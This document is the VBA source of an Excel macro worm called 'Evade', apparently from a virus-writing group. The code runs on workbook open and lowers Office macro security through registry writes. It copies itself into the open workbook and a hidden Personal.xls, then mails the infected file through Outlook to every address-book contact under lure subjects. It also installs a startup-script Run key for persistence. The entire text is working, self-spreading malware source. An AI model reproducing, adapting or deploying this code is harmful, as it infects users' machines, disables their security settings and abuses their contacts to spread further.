Attribute VB_Name = "Evade"
Sub Auto_Open()
Application.OnSheetActivate = "osaEvade"
End Sub
Sub osaEvade()
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = False
Application.EnableCancelKey = xlDisabled
Application.DisplayStatusBar = False
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsc = CreateObject("WScript.Shell")
RegDword = "REG_DWORD"
RegSecurity = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version
ExcelSecurity1 = RegSecurity & "\Excel\Security\Level"
ExcelSecurity2 = RegSecurity & "\Word\Security\AccessVBOM"
wsc.RegWrite ExcelSecurity1, 1, RegDword
wsc.RegWrite ExcelSecurity2, 1, RegDword
Application.VBE.ActiveVBProject.VBComponents("Evade").Export fso.GetSpecialFolder(1) & "\Evade.gif"
If Dir(Application.StartupPath & "\Personal.xls") = "Personal.xls" Then
A1 = True
Else
A1 = False
End If
For A3 = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(A3).Name = "Evade" Then
A2 = True
End If
Next
If A2 = False Then
ActiveWorkbook.VBProject.VBComponents.Import fso.GetSpecialFolder(1) & "\Evade.gif"
ActiveWorkbook.SaveAs Filename:=ActiveWorkbook.FullName
End If
If A1 = False Then
Workbooks.Add.SaveAs Filename:=Application.StartupPath & "\Personal.xls"
ActiveWorkbook.VBProject.VBComponents.Import fso.GetSpecialFolder(1) & "\Evade.gif"
ActiveWindow.Visible = False
Workbooks("Personal.xls").Save
End If
Set OutlookApp = CreateObject("Outlook.Application")
If Not OutlookApp = "" Then
Randomize
RndEml = Int((7 * Rnd) + 1)
Select Case RndEml
Case 1: L6 = "Here is that file"
Case 2: L6 = "Important file"
Case 3: L6 = "The file"
Case 4: L6 = "Excel file"
Case 5: L6 = ActiveWorkbook.Name
Case 6: L6 = "The file you wanted"
Case 7: L6 = "Here is the file"
End Select
For Each ContactSwitch In OutlookApp.GetNameSpace("MAPI").AddressLists
For UserGroup = 1 To ContactSwitch.AddressEntries.Count
EmailKey = "HKEY_CURRENT_USER\Software\Zed/[rRlf]\VBS/Evade\RecordContacts\"
ReadIfSent = wsc.RegRead(EmailKey & ContactSwitch.AddressEntries(UserGroup))
If ReadIfSent <> "File Sent" Then
Set OutlookEmail = OutlookApp.CreateItem(0)
OutlookEmail.Recipients.Add ContactSwitch.AddressEntries(UserGroup)
OutlookEmail.Subject = L6
OutlookEmail.Body = "The file I am sending you is confidential as well as important; so don't let anyone else have a copy."
OutlookEmail.Attachments.Add ActiveWorkbook.FullName
OutlookEmail.Importance = 2
OutlookEmail.DeleteAfterSubmit = True
OutlookEmail.Send
wsc.RegWrite EmailKey & ContactSwitch.AddressEntries(UserGroup), "File Sent"
End If
Next
Next
End If
If Dir(fso.GetSpecialFolder(1) & "\Winstart.vbs") <> "Winstart.vbs" Then
Tz = ""
Open fso.GetSpecialFolder(1) & "\Winstart.vbs" For Output As 1
Print #1, CM(Tz)
Close 1
wsc.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Winstart", "Wscript.exe " & fso.GetSpecialFolder(1) & "\Winstart.vbs %1"
End If
End Sub
Function CM(CN)
For GC = 1 To Len(CN) Step 2
CM = CM & Chr("&h" & Mid(CN, GC, 2))
Next
End Function
